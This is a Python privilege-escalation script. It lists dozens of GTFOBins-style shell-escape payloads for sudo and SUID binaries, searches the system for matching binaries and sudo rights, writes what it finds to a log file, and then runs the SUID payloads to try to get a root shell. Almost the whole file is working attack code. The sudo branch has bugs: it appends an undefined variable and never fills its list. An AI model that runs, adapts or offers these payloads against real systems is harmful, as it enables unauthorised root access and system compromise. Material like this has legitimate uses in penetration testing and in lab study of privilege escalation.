import subprocess
import os
import sys

sudo_payloads = {
	"ash" : "sudo ash",
	"awk" : "sudo awk \'BEGIN {system(\"/bin/sh\")}\'",
	"bash" : "sudo bash",
	"busybox" : "sudo busybox sh",
	"capsh" : "sudo capsh --",
	"cpulimit" : "sudo cpulimit -l 100 -f /bin/sh",
	"csh" : "sudo csh",
	"csvtool" : "sudo csvtool call \'/bin/sh;false\' /etc/passwd",
	"dash" : "sudo dash",
	"docker" : "sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
	"emacs" : "sudo emacs -Q -nw --eval \'(term \"/bin/sh\")\'",
	"env" : "sudo env /bin/sh",
	"expect" : "sudo expect -c \'spawn /bin/sh;interact\'",
	"find" : "sudo find . -exec /bin/sh \; -quit",
	"fish" : "sudo fish",
	"flock" : "sudo flock -u / /bin/sh",
	"gawk" : "sudo gawk \'BEGIN {system(\"/bin/sh\")}\'",
	"gdb" : "sudo gdb -nx -ex \'!sh\' -ex quit",
	"ionice" : "sudo ionice /bin/sh",
	"jrunscript" : "sudo jrunscript -e \"exec(\'/bin/sh -c \$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)\')\"",
	"ksh" : "sudo ksh",
	"logsave" : "sudo logsave /dev/null /bin/sh -i",
	"lua" : "sudo lua -e \'os.execute(\"/bin/sh\")\'",
	"mawk" : "sudo mawk \'BEGIN {system(\"/bin/sh\")}\'",
	"nice" : "sudo nice /bin/sh",
	"node" : "sudo node -e \'child_process.spawn(\"/bin/sh\", {stdio: [0, 1, 2]})\'",
	"nohup" : "sudo nohup /bin/sh -c \"sh <$(tty) >$(tty) 2>$(tty)\"",
	"openvpn" : "sudo openvpn --dev null --script-security 2 --up \'/bin/sh -c sh\'",
	"perf" : "sudo perf stat /bin/sh",
	"perl" : "sudo perl -e \'exec \"/bin/sh\";\'",
	"python3" : "sudo python3 -c \'import os; os.system(\"/bin/sh\")\'",
	"python2" : "sudo python2 -c \'import os; os.system(\"/bin/sh\")\'",
	"python" : "sudo python -c \'import os; os.system(\"/bin/sh\")\'",
	"rlwrap" : "sudo rlwrap /bin/sh",
	"rsync" : "sudo rsync -e \'sh -c \"sh 0<&2 1>&2\"\' 127.0.0.1:/dev/null",
	"run-parts" : "sudo run-parts --new-session --regex \'^sh$\' /bin",
	"sash" : "sudo sash",
	"sed" : "sudo sed -n \'1e exec sh 1>&0\' /etc/hosts",
	"setarch" : "sudo setarch $(arch) /bin/sh",
	"sqlite3" : "sudo sqlite3 /dev/null \'.shell /bin/sh\'",
	"sshpass" : "sudo sshpass /bin/sh",
	"stdbuf" : "sudo stdbuf -i0 /bin/sh",
	"strace" : "sudo strace -o /dev/null /bin/sh",
	"taskset" : "sudo taskset 1 /bin/sh",
	"time" : "sudo /usr/bin/time /bin/sh",
	"timeout" : "sudo timeout --foreground 7d /bin/sh",
	"unshare" : "sudo unshare /bin/sh",
	"view" : "sudo view -c \':!/bin/sh\'",
	"vim" : "sudo vim -c \':!/bin/sh\'",
	"vimdiff" : "sudo vimdiff -c \':!/bin/sh\'",
	"watch" : "sudo watch -x sh -c \'reset; exec sh 1>&0 2>&0\'",
	"xargs" : "sudo xargs -a /dev/null sh",
	"zsh" : "sudo zsh"
}

suid_payloads = {
	"ksh" : "ksh -p",
	"bash" : "bash -p",
	"busybox" : "busybox sh",
	"capsh" : "capsh --gid=0 --uid=0 --",
	"cpulimit" : "cpulimit -l 100 -f -- /bin/sh -p",
	"csh" : "csh -b",
	"csvtool" : "csvtool call \'/bin/sh -p;false\' /etc/passwd",
	"dash" : "dash -p",
	"docker" : "docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
	"env" : "env /bin/sh -p",
	"expect" : "expect -c \'spawn /bin/sh -p;interact\'",
	"find" : "find . -exec /bin/sh -p \; -quit",
	"fish" : "fish",
	"flock" : "flock -u / /bin/sh -p",
	"gdb" : "gdb -nx -ex \'python import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")\' -ex quit",
	"ionice" : "ionice /bin/sh -p",
	"jrunscript" : "jrunscript -e \"exec(\'/bin/sh -pc \$@|sh\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)\')\"",
	"ksh" : "ksh -p",
	"logsave" : "logsave /dev/null /bin/sh -i -p",
	"nice" : "nice /bin/sh -p",
	"node" : "node -e \'child_process.spawn(\"/bin/sh\", [\"-p\"], {stdio: [0, 1, 2]})\'",
	"nohup" : "nohup /bin/sh -p -c \"sh -p <$(tty) >$(tty) 2>$(tty)\"",
	"openvpn" : "openvpn --dev null --script-security 2 --up \'/bin/sh -p -c \"sh -p\"\'",
	"perf" : "perf stat /bin/sh -p",
	"perl" : "perl -e \'exec \"/bin/sh\";\'",
	"python3" : "python3 -c \'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")\'",
	"python2" : "python2 -c \'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")\'",
	"python" : "python -c \'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")\'",
	"rlwrap" : "rlwrap -H /dev/null /bin/sh -p",
	"rsync" : "rsync -e \'sh -p -c \"sh 0<&2 1>&2\"\' 127.0.0.1:/dev/null",
	"run-parts" : "run-parts --new-session --regex \'^sh$\' /bin --arg=\'-p\'",
	"sash" : "sash",
	"setarch" : "setarch $(arch) /bin/sh -p",
	"sshpass" : "sshpass /bin/sh -p",
	"stdbuf" : "stdbuf -i0 /bin/sh -p",
	"strace" : "strace -o /dev/null /bin/sh -p",
	"taskset" : "taskset 1 /bin/sh -p",
	"time" : "time /bin/sh -p",
	"timeout" : "timeout --foreground 7d /bin/sh -p",
	"unshare" : "unshare -r /bin/sh",
	"watch" : "watch -x sh -c \'reset; exec sh 1>&0 2>&0\'",
	"xargs" : "xargs -a /dev/null sh -p",
	"zsh" : "zsh"
}

suidbins = []
sudobins = []
errors = {}
hasfullsudopriv = False


#----Check for SUID Binaries----
print("Finding SUID set binaries")
result = subprocess.run(['find', '/', '-perm', '-4000'], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
outp = result.stdout.decode("utf-8")
if not outp:
	print("no suid binaries at all")
else:
	for binname in suid_payloads.keys():
		if binname in outp:
			print("suidbin " +binname+" found!")
			suidbins.append(binname)

print("")
#----Check for SUDO perms----
print("Cheking sudo perms")
result = subprocess.run(['sudo', '-l'], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
outp = result.stdout.decode("utf-8")

if "(ALL : ALL) ALL" in outp:
	hasfullsudopriv = True
	
outp = outp.split("may run the following commands on")[1]
if not outp:
	print("no sudo perms at all")
else:
	for binname in sudo_payloads.keys():
		if binname in outp:
			print("sudobin"+binname+" found!")
			suidbins.append(i)

#----Log findings to file----
with open("gtfobinlog.txt","w") as outfile:
	if hasfullsudopriv:
		outfile.write("User has full sudo privelleges!\n")

	outfile.write("----------Format----------\n")
	outfile.write("Binary : Payload\n\n\n")
	
	outfile.write("----------Found SUID Bins----------\n")
	for binname in suidbins:
		outfile.write("{} : {}\n".format(binname, suid_payloads[binname]))
	
	outfile.write("\n\n")
	
	outfile.write("----------Found SUDO Bins----------\n")
	for binname in sudobins:
		outfile.write("{} : {}\n".format(binname, sudo_payloads[binname]))

#----Exploit bin to gain root priv----
for suidbin in suidbins:
	try:	
		print("trying "+suid_payloads[suidbin])
		os.system(suid_payloads[suidbin])
		sys.exit()
	except Exception as e:
		errors[suidbin] = e.__class__







